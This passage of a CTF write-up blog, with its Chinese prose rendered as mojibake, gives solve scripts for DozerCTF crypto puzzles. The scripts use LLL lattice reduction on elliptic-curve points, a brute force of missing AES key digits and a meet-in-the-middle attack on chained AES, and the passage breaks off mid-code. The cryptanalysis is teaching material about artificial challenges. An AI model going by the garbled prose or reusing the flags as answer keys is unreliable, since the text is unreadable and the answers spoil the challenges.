class="number">0x7696ea73e7345896be516aac44aa8ba35242babc3853a2a3fbf7081a3f5a845dba81f01d7aba946f7a9886eb1918d367baa87f387e86e095bb88bbc44f58768e8c2db3a1926301c984ea19f8e680fb7f4f7108c4c8565fc7cb66284bdf81e547e446faa80e88a59ceae3bb43b2c6ac1f8858e5f126fcc224f62aef611184d714db86a5c19060e0a9844def0e047d3a46e9d64f42c0cef9f85812068d580f9722b1520c2847b34c6ed7afc89b633113606aa397c10f1ea653e4d15fb160f2c1d4750a6c4eaef7e6fa56c35d393fe7d3ef91fc9ea56a69fd9614e8c39da6dc0981c6004468db1d81a13ebaf3bfd9e640c39b63b107605ba28a5c18b4a03ca627102ff63ddc8483dce2c06e97f614a4d93f9d615f849a6ce0c164217dabe849ceaf1ade997700daf9aca95f7811cc615cf61887e199ddf963a780829cc186b96d96f2b3c1f001eaa0e289b7fc79e5c24ce2aad55f9adb9ecaacba5445773222aee3cf997c171f7bcbcba65caa6c254186a1fa1982521d8ab1</span>)</span><br><span class="line">x2 = F(<span class="number">0x3117ba57d46bd2da19fed7e3f087ec252b45340c1a338a5096a94538be0f9776388ec70cc22c475968a352f2a34f1637b660aea2f5a741d925d550b9bc91f3b5da0e9b6585aee5413d89f6734651439f7c6905c2b98b7e4aef425a50852b626ad7bd2a4f67909acc0d6ac7e33688f3cf676ac3c00a32e12eecb384cd9b099244c2ef37f054a271a2c174f3eac5553415b097ee84b590258df022d1142b28be0ca756784bfae2e42a1bf98a3c48ea9baa2466172673b978d1372a2ac5e20ff869dacbbfe0f56d4d4de947d39a5bb643cd3b00c1e6d4b82e090105358fc105f75ee1dec962696ef406474d5934ed27e375952012bf797ebd8fff2d4b08935086850fc89039b3c4c0ab712a9859c6e43dad3fae4c5048d60a5069c338a63ac49f3a7fa99614bd8a17a9522c82333ecaf88c41b0b8be60ebee5b52df4d853ef397786a113b5064e236299e795dbec72baf001c6dd973e424e86e79368d6b10f3b43a47eb8fae6e48c2b42aa7e2566879f9b675e4837a59366b</span>)</span><br><span class="line">y2 = F(<span class="number">0x1e6d85c241d60abc738c606cc4237a617f7a341934d59cd0a3becbb1f4acdc740673a84df7646d1afd08d0d132d8188a35eca0ca8bee5208b73b141de1c4a4a254c6f6278f6860d8d40d9eb301281373dadb1e9bfbeeaa4b0b1ef48b787b47a490cce2f2c64d03a61036ebe565fe4f93dec2e030ecf1a91d1c65b82dfca045b07c526a87293d4844d92327669ca19a2a2e62d4e6e9d46d24d0994434e52f2ea1e9492d46039959afa75365d88e90ab13097f075c4a93d102514cac901ca760155152788e5d352c09e012f6d87fb262d3db9174014c2d9c88e289c902700dc202b05c0600b3f96be0ffc10ae58738718fee7c21e387ddf390a9a1e26a6cb2b744971b67621c1211f0127969a969318beb60a361b924db7707b4170ed3af22dc412d15eb71c553dc79dbebc238dc2baecea806351288b05db9f6885cc53af7509aa3c810540e648ff5e94ba75bf0dbf097d515babe0f99dcd4ddcc10f7a6549a3f12148ca51e4f4f5ab16bf0cb5c069b2cd87c1738bce308</span>)</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">R = PolynomialRing(F, names=<span class="string">&#x27;aa1, aa2, bb1, bb2, a, b&#x27;</span>)</span><br><span class="line">aa1, aa2, bb1, bb2, a, b = R.gens()</span><br><span class="line">bounds = <span class="built_in">dict</span>(aa1=<span class="number">2</span>**BITS, aa2=<span class="number">2</span>**BITS, bb1=<span class="number">2</span>**BITS, bb2=<span class="number">2</span>**BITS)</span><br><span class="line"></span><br><span class="line">eq0 = x0**<span class="number">3</span> + a*x0 + b - y0**<span class="number">2</span></span><br><span class="line">eq1 = (x1 + aa1)**<span class="number">3</span> + a*(x1 + aa1) + b - (y1 + bb1)**<span class="number">2</span></span><br><span class="line">eq2 = (x2 + aa2)**<span class="number">3</span> + a*(x2 + aa2) + b - (y2 + bb2)**<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resultant</span>(<span class="params">p1, p2, var</span>):</span></span><br><span class="line">    p1 = p1.change_ring(QQ)</span><br><span class="line">    p2 = p2.change_ring(QQ)</span><br><span class="line">    var = var.change_ring(QQ)</span><br><span class="line">    r = p1.resultant(p2, var)</span><br><span class="line">    <span class="keyword">return</span> r.change_ring(F)</span><br><span class="line"></span><br><span class="line">poly = eq0</span><br><span class="line">poly1 = resultant(poly, eq1, b)</span><br><span class="line">poly2 = resultant(poly, eq2, b)</span><br><span class="line">poly = resultant(poly1, poly2, a)</span><br><span class="line">poly /= poly.coefficients()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(poly.monomials())</span><br><span class="line"></span><br><span class="line">bits = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> mono <span class="keyword">in</span> poly.monomials():</span><br><span class="line">    mono_bits = RR(log(mono.change_ring(ZZ).subs(**bounds), <span class="number">2</span>))</span><br><span class="line">    <span class="built_in">print</span>(mono, <span class="string">&quot;%.2f&quot;</span> % mono_bits )</span><br><span class="line">    bits += mono_bits</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(poly.monomials())</span><br><span class="line">m = matrix(ZZ, n, n)</span><br><span class="line">m[<span class="number">0</span>] = vector(poly.coefficients())</span><br><span class="line">m[<span class="number">1</span>:,<span class="number">1</span>:] = p * identity_matrix(n-<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prmat</span>(<span class="params">m</span>):</span></span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> m:</span><br><span class="line">        <span class="built_in">print</span>(*[&#123;<span class="number">0</span>: <span class="string">&quot;0&quot;</span>, <span class="number">1</span>: <span class="string">&quot;1&quot;</span>, p: <span class="string">&quot;p&quot;</span>&#125;.get(v, <span class="string">&quot;x&quot;</span>) <span class="keyword">for</span> v <span class="keyword">in</span> row])</span><br><span class="line">prmat(m)</span><br><span class="line"></span><br><span class="line">monos = vector(poly.change_ring(ZZ).monomials())</span><br><span class="line">factors = [mono(**bounds) <span class="keyword">for</span> mono <span class="keyword">in</span> monos]</span><br><span class="line"></span><br><span class="line">[m.rescale_col(i, factor) <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors)]</span><br><span class="line">m = m.LLL()</span><br><span class="line">m = m.change_ring(QQ)</span><br><span class="line">[m.rescale_col(i, QQ(<span class="number">1</span>)/factor) <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors)]</span><br><span class="line">m = m.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">polys = []</span><br><span class="line"><span class="keyword">for</span> pol <span class="keyword">in</span> m*monos:</span><br><span class="line">    maxval = <span class="built_in">sum</span>(</span><br><span class="line">        (<span class="built_in">abs</span>(<span class="built_in">int</span>(coef)) * mono).change_ring(ZZ).subs(**bounds)</span><br><span class="line">        <span class="keyword">for</span> coef, mono <span class="keyword">in</span> pol</span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;polynomial with max value&quot;</span>, RR(log(maxval, <span class="number">2</span>)), <span class="string">&quot;bits&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> maxval &lt; p:</span><br><span class="line">        polys.append(pol)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;got&quot;</span>, <span class="built_in">len</span>(polys), <span class="string">&quot;polynomials&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span>(<span class="params">hs, <span class="built_in">vars</span>, solbits, padbits=<span class="number">20</span></span>):</span>    </span><br><span class="line">    nbits = solbits + padbits</span><br><span class="line">    <span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line">    sols = &#123;(<span class="number">0</span>,) * <span class="built_in">len</span>(<span class="built_in">vars</span>)&#125;</span><br><span class="line">    polys = [h.change_ring(Zmod(<span class="number">2</span>**nbits)) <span class="keyword">for</span> h <span class="keyword">in</span> hs]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbits):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bit&quot;</span>, i, <span class="string">&quot;/&quot;</span>, nbits, <span class="string">&quot;:&quot;</span>, <span class="built_in">len</span>(sols), <span class="string">&quot;candidates&quot;</span>)</span><br><span class="line">        sols2 = <span class="built_in">set</span>()</span><br><span class="line">        mod = <span class="number">2</span>**i</span><br><span class="line">        polys = [h.change_ring(Zmod(<span class="number">2</span>*mod)) <span class="keyword">for</span> h <span class="keyword">in</span> hs]</span><br><span class="line">        <span class="keyword">for</span> bits <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">2</span>), repeat=<span class="built_in">len</span>(<span class="built_in">vars</span>)):</span><br><span class="line">            <span class="keyword">for</span> sol <span class="keyword">in</span> sols:</span><br><span class="line">                sol2 = <span class="built_in">tuple</span>(ss + bit*mod <span class="keyword">for</span> ss, bit <span class="keyword">in</span> <span class="built_in">zip</span>(sol, bits))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">any</span>(poly(*sol2) <span class="keyword">for</span> poly <span class="keyword">in</span> polys):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                sols2.add(sol2)</span><br><span class="line">        sols = sols2</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sols:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;fail&quot;</span>, i)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sols?&quot;</span>, i, <span class="built_in">len</span>(sols))</span><br><span class="line">    <span class="comment"># TBD: automate adding pad bits to determine right sols by smallness</span></span><br><span class="line">    <span class="keyword">for</span> sol <span class="keyword">in</span> sols:</span><br><span class="line">        <span class="comment"># fix signs</span></span><br><span class="line">        sol = [v <span class="keyword">if</span> v &lt; <span class="number">2</span>**(nbits-<span class="number">1</span>) <span class="keyword">else</span> (v-<span class="number">2</span>**nbits) <span class="keyword">for</span> v <span class="keyword">in</span> sol]</span><br><span class="line">        <span class="comment"># too large solution</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(<span class="built_in">abs</span>(v) &gt;= <span class="number">2</span>**solbits <span class="keyword">for</span> v <span class="keyword">in</span> sol):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># wrong solution</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(poly(*sol) <span class="keyword">for</span> poly <span class="keyword">in</span> hs):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">yield</span> sol</span><br><span class="line">        </span><br><span class="line">R = PolynomialRing(ZZ, names=<span class="string">&#x27;aa1, aa2, bb1, bb2&#x27;</span>)</span><br><span class="line">polys = [R(pol) <span class="keyword">for</span> pol <span class="keyword">in</span> polys]</span><br><span class="line">sols = <span class="built_in">list</span>(recover(polys[:<span class="number">4</span>], R.gens(), BITS))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">ct = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;1df819824bb4299817560c5ee69bd8eaabaf3c47e33a57e39eb1ccddec66d9fb38c6df8ebf35b368ebeecd803d66afb2&quot;</span>)</span><br><span class="line">sol_aa1, sol_aa2, sol_bb1, sol_bb2 = sols[<span class="number">0</span>]</span><br><span class="line">parts = [</span><br><span class="line">    (<span class="built_in">int</span>(x1)+<span class="built_in">int</span>(sol_aa1))^^<span class="built_in">int</span>(x1),</span><br><span class="line">    (<span class="built_in">int</span>(y1)+<span class="built_in">int</span>(sol_bb1))^^<span class="built_in">int</span>(y1),</span><br><span class="line">    (<span class="built_in">int</span>(x2)+<span class="built_in">int</span>(sol_aa2))^^<span class="built_in">int</span>(x2),</span><br><span class="line">    (<span class="built_in">int</span>(y2)+<span class="built_in">int</span>(sol_bb2))^^<span class="built_in">int</span>(y2),</span><br><span class="line">]</span><br><span class="line">key = pack(<span class="string">&quot;&gt;4I&quot;</span>, *parts)</span><br><span class="line"><span class="built_in">print</span>(AES.new(key, mode=AES.MODE_ECB).decrypt(ct).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#DozerCTF&#123;B3y0ND_ThE_4QUIL4_2IFT&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="æ‰‹æ»‘çš„è¢å­¦é•¿"><a href="#æ‰‹æ»‘çš„è¢å­¦é•¿" class="headerlink" title="æ‰‹æ»‘çš„è¢å­¦é•¿"></a>æ‰‹æ»‘çš„è¢å­¦é•¿</h3><blockquote><p>è¢å­¦é•¿å‡ºé¢˜çš„æ—¶å€™ä¸å°å¿ƒæŠŠå¯†æ–‡ç»™åˆ æ‰å‡ ä½ï¼Œç°åœ¨ç”¨$æ›¿æ¢äº†ä¸€ä¸‹ï¼Œå‡‘æ´»çœ‹å§</p></blockquote><p>ä»£ç é€»è¾‘ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">plain:</span><br><span class="line">I do not care th</span><br><span class="line">e result2?9cf037</span><br><span class="line">f8b3a?2b19b5bda9</span><br><span class="line">78c294?5\x00\x00\x00\x00\x00\x00\x00\x00</span><br><span class="line"></span><br><span class="line">key:</span><br><span class="line">2?9cf037f8b3a?2b19b5bda978c294?5</span><br><span class="line"></span><br><span class="line">encrypt:</span><br><span class="line">91e5fb43f053b21ce12e41df0b0ae0bb</span><br><span class="line">6a20c55719151$$fccecb4$$$$$2a27c</span><br><span class="line">8c582c6704f$$$$153bd3313b84235ac</span><br><span class="line">e16a7b3b190$e487abfa9$cf379d1a3c</span><br><span class="line"></span><br><span class="line">algorithm:</span><br><span class="line">c1 = AES(key, p1^f2),  e1=c1^f1</span><br><span class="line">c2 = AES(key, p2^c1),  e2=c2^p1</span><br><span class="line">c3 = AES(key, p3^c2),  e3=c3^p2</span><br><span class="line">c4 = AES(key, p4^c3),  e4=c4^p3</span><br><span class="line">flag = f1+f2</span><br></pre></td></tr></table></figure><p>ä» <code>key</code> å’Œ <code>e4</code> å…¥æ‰‹çˆ†ç ´ï¼ŒæœªçŸ¥ä½æ•°3+2=5å±‚å¾ªç¯ï¼ˆ16^5=1048576ï¼‰ï¼Œæ ¹æ®å·²çŸ¥æ¡ä»¶ï¼Œæšä¸¾æ±‚å‡ºflagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_hex</span>(<span class="params">s, t</span>):</span></span><br><span class="line"><span class="keyword">return</span> strxor(<span class="built_in">bytes</span>.fromhex(s),<span class="built_in">bytes</span>.fromhex(t)).<span class="built_in">hex</span>().rjust(<span class="number">32</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key1 <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> key2 <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> key3 <span class="keyword">in</span> dic:</span><br><span class="line">key = <span class="string">&#x27;2&#123;&#125;9cf037f8b3a&#123;&#125;2b19b5bda978c294&#123;&#125;5&#x27;</span>.<span class="built_in">format</span>(key1,key2,key3)</span><br><span class="line">p1 = <span class="string">b&#x27;I do not care th&#x27;</span>.<span class="built_in">hex</span>()</span><br><span class="line">p2 = <span class="string">b&#x27;e result&#x27;</span>.<span class="built_in">hex</span>() + key[:<span class="number">8</span>].encode().<span class="built_in">hex</span>()</span><br><span class="line">p3 = key[<span class="number">8</span>:<span class="number">24</span>].encode().<span class="built_in">hex</span>()</span><br><span class="line">p4 = key[<span class="number">24</span>:].encode().<span class="built_in">hex</span>() + <span class="string">&#x27;08&#x27;</span>*<span class="number">8</span></span><br><span class="line"><span class="keyword">for</span> e41 <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> e42 <span class="keyword">in</span> dic:</span><br><span class="line">e4 = <span class="string">&#x27;e16a7b3b190&#123;&#125;e487abfa9&#123;&#125;cf379d1a3c&#x27;</span>.<span class="built_in">format</span>(e41,e42)</span><br><span class="line">c4 = xor_hex(e4, p3)</span><br><span class="line">c3 = xor_hex(p4, AES.new(<span class="built_in">bytes</span>.fromhex(key), AES.MODE_ECB).decrypt(<span class="built_in">bytes</span>.fromhex(c4)).<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment">#e3 = 8c582c6704f$$$$153bd3313b84235ac</span></span><br><span class="line">e3 = xor_hex(c3, p2)</span><br><span class="line"><span class="keyword">if</span> e3.startswith(<span class="string">&#x27;8c582c6704f&#x27;</span>) <span class="keyword">and</span> e3.endswith(<span class="string">&#x27;153bd3313b84235ac&#x27;</span>):</span><br><span class="line">c2 = xor_hex(p3, AES.new(<span class="built_in">bytes</span>.fromhex(key), AES.MODE_ECB).decrypt(<span class="built_in">bytes</span>.fromhex(c3)).<span class="built_in">hex</span>())</span><br><span class="line">e2 = xor_hex(c2, p1)</span><br><span class="line"><span class="comment">#e2 = 6a20c55719151$$fccecb4$$$$$2a27c</span></span><br><span class="line"><span class="keyword">if</span> e2.startswith(<span class="string">&#x27;6a20c55719151&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;fccecb4&#x27;</span> <span class="keyword">in</span> e2 <span class="keyword">and</span> e2.endswith(<span class="string">&#x27;2a27c&#x27;</span>):</span><br><span class="line">c1 = xor_hex(p2, AES.new(<span class="built_in">bytes</span>.fromhex(key), AES.MODE_ECB).decrypt(<span class="built_in">bytes</span>.fromhex(c2)).<span class="built_in">hex</span>())</span><br><span class="line">e1 = <span class="string">&#x27;91e5fb43f053b21ce12e41df0b0ae0bb&#x27;</span></span><br><span class="line">f1 = xor_hex(e1, c1)</span><br><span class="line">f2 = xor_hex(p1, AES.new(<span class="built_in">bytes</span>.fromhex(key), AES.MODE_ECB).decrypt(<span class="built_in">bytes</span>.fromhex(c1)).<span class="built_in">hex</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(f1)+<span class="built_in">bytes</span>.fromhex(f2))</span><br><span class="line">                            </span><br><span class="line"><span class="comment">#hei_my_bro_this_is_flag_you_know</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="strange-encrypt"><a href="#strange-encrypt" class="headerlink" title="strange encrypt"></a>strange encrypt</h3><blockquote><p>å­¦é•¿å­¦å§è¯´è¿™é¢˜åº”è¯¥ä¸éš¾å§ï¼Ÿ</p></blockquote><p>å·²çŸ¥ <code>fl4g</code> å’Œ640æ¬¡AESåŠ å¯†åçš„ <code>fl4g_enc</code>ï¼Œ640ä¸ªç”Ÿæˆçš„<code>key</code> æŒ‰ <code>extend_secret</code> äºŒè¿›åˆ¶ä½é€‰æ‹©å‰åŠæ®µæˆ–ååŠæ®µä½œä¸ºæ¯è½®AESä½¿ç”¨çš„ <code>key</code>ã€‚</p><p>å·²çŸ¥10ä½ <code>secret</code> çš„å‰ä¸¤ä½ï¼Œå¯¹åº”æ‰©å±• <code>extend_secret</code> ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">extend_secret:</span><br><span class="line">s1=[?,?,?,?,7]</span><br><span class="line">s2=[8,?,?,?,?]</span><br><span class="line">p1=(xxxx xxxx xxxx xxxx 0111)*16</span><br><span class="line">p2=(1000 xxxx xxxx xxxx xxxx)*16</span><br><span class="line">ex=p1+p2</span><br></pre></td></tr></table></figure><p>é‡‡ç”¨ä¸­é—´äººæ”»å‡»(MITM)ï¼Œæšä¸¾ <code>s1</code> ä¸­æœªçŸ¥4ä½å¾—åˆ°<code>fl4g</code> AESåŠ å¯†32æ¬¡çš„å¯èƒ½å€¼ï¼ˆ16^4=65536ï¼‰ï¼Œå†æšä¸¾ <code>s2</code> ä¸­æœªçŸ¥4ä½å¾—åˆ° <code>fl4g_enc</code> AESè§£å¯†32æ¬¡çš„å¯èƒ½å€¼ï¼ˆ16^4=65536ï¼‰ï¼Œä¸¤ç»„å¯èƒ½å€¼ä¸­ç›¸ç­‰çš„å³ä¸ºæ‰€æ±‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">init_key = <span class="string">b&#x27;look_at_here!you_may_need_it!!&#x27;</span></span><br><span class="line">fl4g = <span class="string">b&#x27;fl4g&#123;I_HaTe_The_DaMn_FaKe_FlAg&#125;&#x27;</span></span><br><span class="line">fl4g_enc = <span class="string">&#x27;4b559c0adaf6c14584aea729ed3c544cee8e3ea8cf1d2dc67d620e59c1053976&#x27;</span></span><br><span class="line">flag_enc = <span class="string">&#x27;ed0a40ac74c25e549a92fb90eb07b86ba3de0001a014c2e31c5e0dc6ad8a1fd8cdad1ea856f6b47b4e960bdeb6a447fb&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s + (<span class="number">16</span> - (<span class="built_in">len</span>(s) % <span class="number">16</span>)) * <span class="string">b&#x27;\x11&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genKeys</span>(<span class="params">init</span>):</span></span><br><span class="line">    keys = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">640</span>):</span><br><span class="line">        key = hashlib.md5(init).hexdigest()</span><br><span class="line">        keys.append(key)</span><br><span class="line">        init = key.encode()</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extend</span>(<span class="params">s</span>):</span></span><br><span class="line">    s1 = [ <span class="built_in">int</span>(s[<span class="number">2</span> * i], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">2</span>)]</span><br><span class="line">    s2 = [ <span class="built_in">int</span>(s[<span class="number">2</span> * i + <span class="number">1</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">2</span>)][::-<span class="number">1</span>]</span><br><span class="line">    part1 = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x : <span class="string">&#x27;&#123;:&gt;04&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">bin</span>(x)[<span class="number">2</span>:]), s1)) * <span class="number">16</span></span><br><span class="line">    part2 = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x : <span class="string">&#x27;&#123;:&gt;04&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">bin</span>(x)[<span class="number">2</span>:]), s2)) * <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> part1 + part2</span><br><span class="line"></span><br><span class="line">keys = genKeys(init_key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">msg</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i,k <span class="keyword">in</span> <span class="built_in">enumerate</span>(keys):</span><br><span class="line">        b = <span class="built_in">int</span>(ex[i]) &amp; <span class="number">1</span></span><br><span class="line">        key = k[ b * <span class="number">16</span> : (b + <span class="number">1</span>) * <span class="number">16</span>]</span><br><span class="line">        aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        msg = aes.encrypt(msg)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">msg</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">640</span>-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        b = <span class="built_in">int</span>(ex[i]) &amp; <span class="number">1</span></span><br><span class="line">        key = keys[i][b*<span class="number">16</span>:(b+<span class="number">1</span>)*<span class="number">16</span>]</span><br><span class="line">        aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        msg = aes.decrypt(msg)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half_enc</span>(<span class="params">msg, ex</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">320</span>):</span><br><span class="line">        b = <span class="built_in">int</span>(ex[i]) &amp; <span class="number">1</span></span><br><span class="line">        key = keys[i][ b * <span class="number">16</span> : (b + <span class="number">1</span>) * <span class="number">16</span>]</span><br><span class="line">        aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        msg = aes.encrypt(msg)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half_dec</span>(<span class="params">msg, ex</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">640</span>-<span class="number">1</span>, <span class="number">320</span>-<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        b = <span class="built_in">int</span>(ex[i-<span class="number">320</span>]) &amp; <span class="number">1</span></span><br><span class="line">        key = keys[i][b*<span class="number">16</span>:(b+<span class="number">1</span>)*<span class="number">16</span>]</span><br><span class="line">        aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">        msg = 